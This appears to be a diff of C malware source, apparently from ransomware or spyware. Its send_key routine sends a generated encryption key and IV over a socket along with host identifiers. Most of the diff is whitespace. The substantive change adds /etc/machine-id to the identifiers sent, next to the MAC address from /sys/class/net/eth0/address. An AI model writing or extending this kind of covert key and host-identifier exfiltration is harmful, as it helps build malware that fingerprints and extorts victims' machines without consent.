@@ -150,20 +150,20 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 
 void send_txt(char * filename, int sockID)
 {
-    FILE * file = fopen(filename, "r");
-    char line[BUFSIZE];
+	FILE * file = fopen(filename, "r");
+	char line[BUFSIZE];
 	char filename_path[BUFSIZE] = {0};
-	
+
 	strcat(filename_path, "Les données viennent du fichier: ");
 	strcat(filename_path, filename);
 	strcat(filename_path, "\n");
 	send(sockID, (const char *)filename_path, strlen(filename_path), 0);
 	
-    while (fgets(line, sizeof(line), file)) 
+	while (fgets(line, sizeof(line), file)) 
 	{
 		send(sockID, (const char *)line, strlen(line), 0);
-    }
-    fclose(file);
+	}
+	fclose(file);
 }
 
 int send_key(char *pKey, char *pIv)
@@ -219,7 +219,11 @@ int send_key(char *pKey, char *pIv)
 		
 		send(sockID, (const char *)space, strlen(space), 0);
 		send(sockID, (const char *)separate, strlen(separate), 0);
-		send_txt("/sys/class/net/eth0/address", sockID);
+		send_txt("/sys/class/net/eth0/address", sockID);		
+		
+		send(sockID, (const char *)space, strlen(space), 0);
+		send(sockID, (const char *)separate, strlen(separate), 0);
+		send_txt("/etc/machine-id", sockID);
 	}
 	close(sockID);
 }
